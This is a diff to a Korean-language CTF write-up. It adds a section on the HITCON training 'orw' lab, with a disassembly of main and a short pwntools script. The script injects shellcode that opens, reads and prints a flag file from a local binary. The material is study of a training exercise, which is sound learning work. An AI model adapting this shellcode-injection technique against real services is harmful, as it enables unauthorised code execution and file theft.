@@ -63,3 +63,51 @@ set eax를 edx의 값으로 설정했더니
 *CTF{debugger_1s_so_p0werful_1n_dyn4m1c_4n4lySis!}*
 를 확인가능했다.
 프로그램이 안 열려서 애먹은 거에 비해 간단한 문제였다
+## Lab2-orw
+이 문제는 서버가 닫혀 있어서 방법론만 공부하였다. 
+~~~
+Give my your shellcode:
+~~~
+프로그램을 실행하니 위와 같이 반응했다. 그리고 pwntool을 통해 짜놓은 exploit code를 hitcon-training git에서 확인했다. shell을 짜려고 하는데 shellcraft라는 방식을 사용해 보았다.
+~~~Dump of assembler code for function main:
+   0x08048548 <+0>:	lea    ecx,[esp+0x4]
+   0x0804854c <+4>:	and    esp,0xfffffff0
+   0x0804854f <+7>:	push   DWORD PTR [ecx-0x4]
+   0x08048552 <+10>:	push   ebp
+   0x08048553 <+11>:	mov    ebp,esp
+   0x08048555 <+13>:	push   ecx
+   0x08048556 <+14>:	sub    esp,0x4
+   0x08048559 <+17>:	call   0x80484cb <orw_seccomp>
+   0x0804855e <+22>:	sub    esp,0xc
+   0x08048561 <+25>:	push   0x80486a0
+   0x08048566 <+30>:	call   0x8048380 <printf@plt>
+   0x0804856b <+35>:	add    esp,0x10
+   0x0804856e <+38>:	sub    esp,0x4
+   0x08048571 <+41>:	push   0xc8
+   0x08048576 <+46>:	push   0x804a060
+   0x0804857b <+51>:	push   0x0
+   0x0804857d <+53>:	call   0x8048370 <read@plt>
+   0x08048582 <+58>:	add    esp,0x10
+   0x08048585 <+61>:	mov    eax,0x804a060
+   0x0804858a <+66>:	call   eax
+   0x0804858c <+68>:	mov    eax,0x0
+   0x08048591 <+73>:	mov    ecx,DWORD PTR [ebp-0x4]
+   0x08048594 <+76>:	leave  
+   0x08048595 <+77>:	lea    esp,[ecx-0x4]
+   0x08048598 <+80>:	ret    
+~~~
+위는 dissasemble main의 결과이다. 
+~~~python
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+from pwn import *
+r=process("orw.bin")
+pay=""
+pay+=asm(shellcraft.open("./lab2flag.txt"))
+pay+=asm(shellcraft.read("eax","esp",100))
+pay+=asm(shellcraft.write(1,"esp",100))
+r.recvuntil("shellcode:")
+r.sendline(pay)
+r.interactive()
+~~~
+flag.txt에 flag가 들어있을 것을 가정했다.(정보가 없어서 다른 wirteup을 참고했다). shellcraft.open에서는 flag.txt에서 flag를 가져온다고 가정하였다. eax에서 받은 100byte 즉 flag 부분을 esp에 저장시킨 후 다시 100byte만큼 write하도록 payload를 작성했다. 문제의 원형태를 몰라 writeup를 참고했으나 이 역시 어려운 문제는 아닌 듯하다. 
